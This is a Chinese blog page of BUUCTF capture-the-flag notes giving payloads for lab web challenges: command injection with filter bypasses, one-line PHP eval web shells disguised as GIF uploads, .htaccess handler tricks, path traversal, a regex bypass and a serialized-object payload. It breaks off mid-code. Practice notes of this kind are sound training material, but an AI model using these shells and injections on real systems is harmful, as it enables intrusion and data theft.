<!DOCTYPE html>
<html lang="zh-CN">

<head>

  <!-- Minima -->
  <!-- Hexo theme created by @adisaktijrs -->

  <!-- Basic Page Needs
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <meta charset="utf-8">

  
  <title>Buuctf刷题笔记</title>
  
  <link rel="canonical" href="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">
  
  <meta name="description" content="命令注入[ACTF2020 新生赛]Exec1127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#x3D;ls&amp;#x3D;&amp;#x3D;				cd转目录;ls查看目录 127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#">
  
  
  <meta name="author" content="Ja1e">
  
  
  
  <meta property="og:site_name" content="Ja1e" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="Buuctf刷题笔记" />
  
  <meta property="og:description" content="命令注入[ACTF2020 新生赛]Exec1127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#x3D;ls&amp;#x3D;&amp;#x3D;				cd转目录;ls查看目录 127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#">
  
  <meta property="og:url" content="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" />

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Buuctf刷题笔记">
  
  <meta name="twitter:description" content="命令注入[ACTF2020 新生赛]Exec1127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#x3D;ls&amp;#x3D;&amp;#x3D;				cd转目录;ls查看目录 127.0.0.1;cd ..&amp;#x2F;..&amp;#x2F;..&amp;#x2F;;&amp;#x3D;&amp;#">
  
  
  
  
  <meta name="twitter:url" content="https://ja1e.github.io/2022/03/23/buuctf%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" />

  <!-- Mobile Specific Metas
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Preload fonts
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>

  <!-- CSS
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/skeleton.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
<link rel="stylesheet" href="/css/prism-dark.css">

  
<link rel="stylesheet" href="/css/prism-line-numbers.css">

  <!-- User css -->
  
  
<link rel="stylesheet" href="/css/user.css">

  

  <!-- Favicon
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

  <!-- Custom Theme Color Style
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  <style>
  a:not(.icon) {
    text-decoration-color: #0FA0CE;
    background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0) 50%,
      #0FA0CE 50%
    );
  }
  blockquote {
    border-left: 8px solid #0FA0CE;
  }
  .nanobar .bar {
    background: #0FA0CE;
  }
  .button.button-primary:hover,
  button.button-primary:hover,
  input[type="submit"].button-primary:hover,
  input[type="reset"].button-primary:hover,
  input[type="button"].button-primary:hover,
  .button.button-primary:focus,
  button.button-primary:focus,
  input[type="submit"].button-primary:focus,
  input[type="reset"].button-primary:focus,
  input[type="button"].button-primary:focus {
    background-color: #0FA0CE;
    border-color: #0FA0CE;
  }
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="search"]:focus,
  input[type="text"]:focus,
  input[type="tel"]:focus,
  input[type="url"]:focus,
  input[type="password"]:focus,
  textarea:focus,
  select:focus {
    border: 1px solid #0FA0CE;
  }
</style>

  <!-- Google Analytics (With Privacy Settings On)
  –––––––––––––––––––––––––––––––––––––––––––––––––– -->
  

  
  <script src="/js/pic.min.js" defer></script>
  

  

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div class="container">
    <div class="row">
      <div>

        <div class="row">
  <div class="two columns" style="max-width: 50px">
    <h1 class="mt-2 mode">
      <div onclick=setDarkMode(true) id="darkBtn">🌑</div>
      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>☀️</div>
      <script >
        if (localStorage.getItem('preferredTheme') == 'dark') {
          setDarkMode(true)
        }
        function setDarkMode(isDark) {
          var darkBtn = document.getElementById('darkBtn')
          var lightBtn = document.getElementById('lightBtn')
          if (isDark) {
            lightBtn.style.display = "block"
            darkBtn.style.display = "none"
            localStorage.setItem('preferredTheme', 'dark');
          } else {
            lightBtn.style.display = "none"
            darkBtn.style.display = "block"
            localStorage.removeItem('preferredTheme');
          }
          document.body.classList.toggle("darkmode");
        }
      </script>
    </h1>
  </div>

  <div class="six columns ml-1">
    <h1 class="mt-2">
      Hi Folks.
    </h1>
  </div>

  <div class="twelve columns">
    <div class="row">
      <div class="nine columns left">
        <a href="/">Home</a>
        
          
          <a href="/about" class="ml">About</a>
          
        
        
      </div>
    </div>
    <hr style="margin-bottom: 2.6rem">
  </div>
</div>
<link rel="stylesheet" href="/js/prism/prism.css">
        <div class="trans">
            <h2>Buuctf刷题笔记</h2>

  <h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h4 id="ACTF2020-新生赛-Exec1"><a href="#ACTF2020-新生赛-Exec1" class="headerlink" title="[ACTF2020 新生赛]Exec1"></a>[ACTF2020 新生赛]Exec1</h4><p>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;&#x3D;&#x3D;ls&#x3D;&#x3D;				cd转目录;ls查看目录</p>
<p>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;&#x3D;&#x3D;cat&#x3D;&#x3D; flag	  cd转目录;cat查看文件内容</p>
<hr>
<h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><pre class="line-numbers language-none"><code class="language-none">通过url传参进行ping操作

?ip&#x3D;127.0.0.1;ls				   发现目标文件flag.php

?ip&#x3D;127.0.0.1;cat falg.php		   无法查看，过滤了空格

?ip&#x3D;127.0.0.1;cat$IFS$1flag.php    使用$IFS$1过滤空格，但还是无法查看

?ip&#x3D;127.0.0.1;cat$IFS$1index.php   发现过滤了很多字符（包括flag）

解决方案：

?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php   利用$a参数替换g，绕过flag过滤;flag在网页源代码中

?ip&#x3D;127.0.0.1;cat$IFS$1&#96;ls&#96;            把ls的结果当cat 的参数直接查看,flag在网页源代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h4><p>知道nmap可以写文件即可	&#x3D;&#x3D;-oG&#x3D;&#x3D;</p>
<p><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</code></p>
<p>然后访问<code>/hack.phtml</code></p>
<p>蚁剑链接，拿<code>flag</code></p>
<hr>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h4 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h4><p>查看源代码发现source.php直接访问</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$_page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现有个hint.php，那就先看看hint</p>
<p>payload:	?file&#x3D;hint.php</p>
<p>发现flag在ffffllllaaaagggg里</p>
<p>payload:	?file&#x3D;source.php&#x3D;&#x3D;%253f&#x3D;&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p>
<hr>
<h4 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h4><p>访问index.php.bak文件，下载源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Just num!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span> <span class="token operator">==</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 	 <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to find out source file!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>弱相等，直接上传<code>?key=123</code></p>
<hr>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h4 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h4><p>过滤了‘?&gt;’，那就换个马：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>后缀名也过滤，那就用phtml</p>
<p>上传时抓包，改文件类型image&#x2F;jpeg</p>
<p>菜刀连接，flag在根目录下</p>
<hr>
<h4 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h4><p>首先js绕过，直接把js 脚本删掉</p>
<p>然后上传4.phtml,内容和极客那题一样</p>
<p>上传时抓包，改文件类型image&#x2F;jpeg</p>
<p>菜刀连接，flag在根目录下</p>
<hr>
<h4 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h4><p>先上传.htaccess</p>
<p>内容为SetHandler application&#x2F;x-httpd-php</p>
<p>再上传小马.jpg格式</p>
<hr>
<h4 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h4><p>先上传.htaccess文件，要抓包改文件类型</p>
<p>再上传.jpg文件，不能出现&lt;?，所以用</p>
<p><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;1&#39;]);&lt;/script&gt;</code></p>
<p>然后连接蚁剑即可</p>
<hr>
<h4 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h4><p>先上传.htaccess文件，要抓包改文件类型，同时要写上<code>魔术幻头</code></p>
<p>在上传小马图片，连接蚁剑即可</p>
<hr>
<h1 id="PHP字符串解析漏洞"><a href="#PHP字符串解析漏洞" class="headerlink" title="PHP字符串解析漏洞"></a>PHP字符串解析漏洞</h1><p>chr(47)——<code>/</code><br>chr(102)——<code>f</code><br>chr(49)——<code>1</code><br>chr(97)——<code>a</code><br>chr(103)——<code>g</code></p>
<hr>
<h4 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h4><p>直接1+1抓包发现calc.php文件，直接访问</p>
<pre class="line-numbers language-none"><code class="language-none">PHP字符串解析特性绕过WAF

输入时发现num只能输入数字，输入字符无法解析。
PHP需要将所有参数转换为有效变量名，因此在解析查询字符串时，它会做两件事：1，删除空白字符；2，将某些字符转换为下划线（包括空格）

现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x3D;&#x3D;scandir()&#x3D;&#x3D;函数：返回指定目录中的文件和目录的数组</p>
<p>&#x3D;&#x3D;var_dump()&#x3D;&#x3D;：输出变量的相关信息</p>
<p>? num&#x3D;1;var_dump(scandir(chr(47)))	扫根目录下的所有文件，也就是是scandir(“&#x2F;“),但是“&#x2F;”被过滤了，所以我们用chr(“47”)绕过      </p>
<p>? num&#x3D;1;var_dump(&#x3D;&#x3D;file_get_contents&#x3D;&#x3D;(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))  读取这个文件</p>
<hr>
<h4 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h4><p>点击菜单栏的buyflag</p>
<p>抓包发现php代码，看</p>
<p>传参为password和money</p>
<p>将cookie的user&#x3D;0改为user&#x3D;1</p>
<p>以POST传参password&#x3D;404a&amp;money&#x3D;1e9</p>
<p>注意在http头部要增加Content-Type: application&#x2F;x-www-form-urlencoded</p>
<hr>
<h4 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h4><p>这题打开看source源代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>  
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Congratulations! The flag is: '</span> <span class="token operator">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> 
    <span class="token punctuation">&#123;</span>  
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看到<code>Congratulations! The flag is: &#39; . FLAG</code>但是仔细查看，发现要使我们输入的字符完完全全与random_bytes(64)相等，显然难度非常大，我们换条路。</p>
<p>有几个知识点：</p>
<p>&#x3D;&#x3D;$_SERVER[‘PHP_SELF’]&#x3D;&#x3D;：表示当前 php 文件相对于网站根目录的位置地址。</p>
<pre class="line-numbers language-none"><code class="language-none">1. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;   						&#x2F;php&#x2F;index.php
2. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;index.php 				&#x2F;php&#x2F;index.php
3. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;index.php?test&#x3D;foo  	&#x2F;php&#x2F;index.php
4. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo  	&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x3D;&#x3D;basename&#x3D;&#x3D;：返回路径中的文件名部分</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/testweb/home.php"</span><span class="token punctuation">;</span>

<span class="token comment">//显示带有文件扩展名的文件名</span>
<span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//home.php</span>

<span class="token comment">//显示不带有文件扩展名的文件名</span>
<span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//home</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag在config.php文件中,但是正则匹配掉了config.php</p>
<p>当访问index.php时，可以在后面加上一些东西，例如&#x2F;index.php&#x2F;config.php，访问的仍然是index.php。但经过basename()后，就变成了config.php，然后再通过?source读取。</p>
<p>如果能绕过正则，就可以访问config.php，进而得到flag</p>
<p>如果构造</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;config.php?souce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>无法绕过正则匹配</p>
<p>用不可显字符绕过正则（后面加 %80 – %ff 的任意字符）</p>
<p>构造payload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;config.php&#x2F;%ff?source<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>







<hr>
<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h4><p>?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
<hr>
<h4 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
